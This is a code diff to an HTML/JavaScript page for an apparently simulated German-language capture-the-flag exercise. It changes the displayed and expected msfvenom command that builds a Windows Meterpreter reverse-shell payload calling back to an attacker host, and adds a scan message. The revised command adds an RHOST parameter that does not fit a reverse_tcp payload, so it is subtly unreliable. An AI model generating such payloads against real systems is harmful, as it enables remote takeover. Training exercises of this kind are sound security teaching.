@@ -78,7 +78,7 @@ RHOST=192.168.1.20
             um eine Meterpreter-Session zu simulieren und die Flag zu erhalten. Der richtige Befehl lautet:
         </p>
         <pre style="background: #f4f4f4; padding: 10px; border-left: 4px solid #007bff; color: #333;">
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 R > payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] RHOST=[RHOST] LPORT=4444 R > payload.exe
         </pre>
 
         <!-- Schritt 1: Netzwerkscan -->
@@ -127,15 +127,16 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 R > payload
                 console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht)\n";
             }, 2000);
             setTimeout(() => {
+                console1.innerHTML += "\nPotenzielle Ziele gefunden. Weiter mit Schritt 2.";
                 document.getElementById("step-1").classList.add("hidden");
                 document.getElementById("step-2").classList.remove("hidden");
-            }, 3000);
+            }, 5000);
         }
 
         function checkExploit() {
             const input = document.getElementById("exploit-command").value.trim();
             const console2 = document.getElementById("console-2");
-            const expectedCommand = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 R > payload.exe";
+            const expectedCommand = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 RHOST=192.168.1.20 LPORT=4444 R > payload.exe";
 
             if (input === expectedCommand) {
                 console2.innerHTML = "Exploit wird ausgeführt...\n";
